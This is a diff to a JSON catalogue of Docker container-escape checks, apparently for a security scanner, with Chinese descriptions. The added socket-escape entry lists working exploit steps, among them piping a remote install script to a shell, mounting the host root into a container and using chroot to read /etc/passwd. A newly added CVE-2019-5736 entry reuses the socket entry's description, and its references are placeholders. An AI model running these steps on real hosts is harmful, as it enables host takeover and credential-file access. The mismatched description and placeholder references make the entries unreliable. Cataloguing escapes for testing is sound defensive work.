@@ -3,7 +3,6 @@
     {
       "name": "Docker 高危启动参数 - 特权模式启动容器",
       "type": "Docker escape",
-      "cve": "无",
       "description": "特权模式逃逸是一种最简单有效的逃逸方法。使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对宿主机的文件读写权限，进而可能通过chroot切换根目录，写入ssh公钥或计划任务等手段进行getshell。",
       "versions_affected": [
         "无"
@@ -35,10 +34,41 @@
     {
       "name": "挂载Docker Socket逃逸",
       "type": "Docker escape",
-      "cve": "无",
       "description": "Docker Socket（也称为Docker API Socket）是Docker引擎的UNIX套接字文件，用于与Docker守护进程（Docker daemon）进行通信。Docker守护进程是Docker引擎的核心组件，负责管理和执行容器。Docker Socket允许用户通过基于RESTful API的请求与Docker守护进程进行通信，以便执行各种操作，例如创建、运行和停止容器，构建和推送镜像，查看和管理容器的日志等。",
       "versions_affected": [
         "无"
+      ],
+      "severity": "Critical",
+      "cvss_score": 0,
+      "test_command": "ls -lah /var/run/docker.sock",
+      "expected_output": "-.*/var/run/docker.sock.*",
+      "steps_to_exploit": [
+        "apt-get update",
+        "apt-get install curl -y",
+        "curl -fsSL https://get.docker.com/ | sh",
+        "docker run -it -v /:/test2 ubuntu /bin/bash",
+        "chroot /test2 /bin/sh -c 'cat /etc/passwd'"
+      ],
+      "steps_to_verify": [
+        "chroot /test2 /bin/sh -c 'ls /.dockerenv'"
+      ],
+      "verify_output":"No such file or directory",
+      "last_step": [
+        "umount -f /test2",
+        "rm -r /test2"
+      ],
+      "mitigation": "禁止docker.socket挂载",
+      "references": [
+        "https://example.com/cve-2024-xxxx",
+        "https://exploit-db.com/exploits/xxxx"
+      ]
+    },
+    {
+      "name": "CVE-2019-5736",
+      "type": "Docker escape",
+      "description": "Docker Socket（也称为Docker API Socket）是Docker引擎的UNIX套接字文件，用于与Docker守护进程（Docker daemon）进行通信。Docker守护进程是Docker引擎的核心组件，负责管理和执行容器。Docker Socket允许用户通过基于RESTful API的请求与Docker守护进程进行通信，以便执行各种操作，例如创建、运行和停止容器，构建和推送镜像，查看和管理容器的日志等。",
+      "versions_affected": [
+        "docker version <=18.09.2 RunC version <=1.0-rc6"
       ],
       "severity": "Critical",
       "cvss_score": 0,
